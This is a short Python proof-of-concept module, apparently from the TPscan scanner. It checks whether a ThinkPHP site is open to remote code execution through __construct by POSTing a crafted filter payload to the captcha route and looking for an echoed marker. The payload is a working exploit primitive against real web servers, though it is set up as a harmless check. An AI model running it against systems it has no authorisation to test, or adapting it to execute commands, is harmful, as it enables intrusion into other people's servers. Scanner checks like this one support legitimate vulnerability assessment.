#!/usr/bin/env python
# coding=utf-8
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": "TPscan",
}
payload = {
    '_method': '__construct',
    'filter[]': 'var_dump',
    'method': 'get',
    'server[REQUEST_METHOD]': '56540676a129760a3',
}


async def thinkphp_construct_code_exec_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        url = urljoin(url, 'index.php?s=captcha')
        resp = requests.post(url, data=payload, headers=headers, timeout=15, verify=False)
        if '56540676a129760a3' in resp.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = url
            pocdict['payload'] = payload
            pocdict['proof'] = '56540676a129760a3'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
